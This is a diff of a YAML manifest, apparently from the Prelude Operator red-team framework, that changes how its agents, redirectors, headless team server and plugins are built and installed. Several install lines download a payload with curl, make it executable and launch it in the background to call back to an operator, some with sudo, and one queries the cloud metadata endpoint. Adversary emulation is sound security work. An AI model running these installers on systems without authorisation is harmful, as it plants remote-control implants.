@@ -1,6 +1,6 @@
 translators:
   metadata:
-    description: Extra Operator listening posts for redirectors
+    description: An extra Operator listening post for redirectors
     purpose: redirector
     build: |
       tar zcf DST.PATH/ftp.tar.gz -C SRC.PATH ftp && tar zcf DST.PATH/grpc.tar.gz -C SRC.PATH grpc
@@ -54,21 +54,25 @@ pneuma:
 
 schism:
   metadata:
-    description: Simple FTP agent (requires a translator)
+    description: Simple Python agent (FTP requires a translator)
     purpose: agent
     zip: 1
     build: |
-      cp SRC.PATH/schism.py DST.PATH
+      cp SRC.PATH/schism-* DST.PATH
     platforms: 
       - windows
       - linux
       - darwin
+      - android
     protocols:
       - ftp
+      - http
   payloads:
-    schism.py:
+    schism-ftp.py:
       install: |
         curl 'PAYLOAD.URL' > /tmp/schism && chmod +x /tmp/schism && pip install ftplib && nohup /tmp/schism -address #{callback} &
+    schism-android.py: {}
+    schism-http.py: {}
 
 nicodemus:
   metadata:
@@ -103,18 +107,32 @@ ctf:
     vulnerable.sh:
       install: curl 'PAYLOAD.URL' > tmp/vulnerable.sh && chmod +x /tmp/vulnerable.sh && sudo ./vulnerable.sh
 
-team:
+headless:
   metadata:
     description: Headless Operator API / Team Server
     purpose: redirector
     required: team
     default: team
-    download:
-      headless: https://s3.amazonaws.com/operator.payloads.open/payloads/team/headless-linux
+    build: |
+      cp SRC.PATH/modes/headless/package.json SRC.PATH/package.json && cd SRC.PATH && \
+      npm install && npm run package && cp SRC.PATH/dist/headless-linux DST.PATH/headless
   payloads:
     headless:
       install: |
-        mkdir -p /tmp/headless && curl 'PAYLOAD.URL' > /tmp/headless/bin && chmod +x /tmp/headless/bin && ssh-keygen -t rsa -f /tmp/headless/ssh_key -q -N '' && nohup sudo /tmp/headless/bin --sessionToken 'TOOL.PSK' --sshKey /tmp/headless/ssh_key --hostName $(curl http://169.254.169.254/latest/meta-data/public-hostname) &
+        mkdir -p /tmp/headless && curl 'PAYLOAD.URL' > /tmp/headless/bin && chmod +x /tmp/headless/bin && ssh-keygen -t rsa -f /tmp/headless/ssh_key -q -N '' && nohup sudo /tmp/headless/bin --sessionToken 'TOOL.PSK' --sshKey /tmp/headless/ssh_key --hostName $(curl http://169.254.169.254/latest/meta-data/public-hostname) >/tmp/headless/headless.log 2>&1  &
+
+plugins:
+  metadata:
+    description: Prelude Operator Community Plugins
+    purpose: plugin
+    build: |
+      npm install && \
+      PLUGIN=editor npm run build:plugin && cp SRC.PATH/build/package/Editor/Editor.html DST.PATH/Editor.html && cp DST.PATH/Editor.html DST.PATH/../../../plugins/Editor/Editor.html && \
+      PLUGIN=connect npm run build:plugin && cp SRC.PATH/build/package/Connect/Connect.html DST.PATH/Connect.html && cp DST.PATH/Connect.html DST.PATH/../../../plugins/Connect/Connect.html
+  payloads:
+    Editor.html: {}
+    Connect.html: {}
+
 T1547.002:
    metadata:
      description: Dropper and payload for T1547.002
